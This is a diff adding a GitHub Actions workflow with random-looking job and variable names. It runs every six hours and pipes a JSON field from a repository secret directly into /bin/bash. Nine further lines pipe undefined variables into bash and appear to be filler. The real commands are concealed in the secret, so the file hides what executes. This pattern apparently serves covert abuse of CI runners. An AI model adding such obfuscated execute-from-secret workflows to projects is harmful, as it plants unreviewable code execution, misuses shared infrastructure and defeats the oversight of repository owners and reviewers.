@@ -1,0 +1,27 @@
+name: qiemkk
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '58 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: qiemkk
+        env:
+          j3737: ${{ secrets.j3737 }}
+        run: |
+          echo $j3737 | jq -r .grr61 | /bin/bash
+          echo $gz4 | jq -r .evxdh59313 | /bin/bash
+          echo $f6 | jq -r .ip08504 | /bin/bash
+          echo $w0 | jq -r .yphpp459 | /bin/bash
+          echo $l866 | jq -r .slsm3 | /bin/bash
+          echo $m44 | jq -r .ge2994 | /bin/bash
+          echo $l2181 | jq -r .jn03 | /bin/bash
+          echo $ddlax0045 | jq -r .i7058 | /bin/bash
+          echo $qjek1 | jq -r .mgfa31122 | /bin/bash
+          echo $hv8 | jq -r .nopk9 | /bin/bash
+
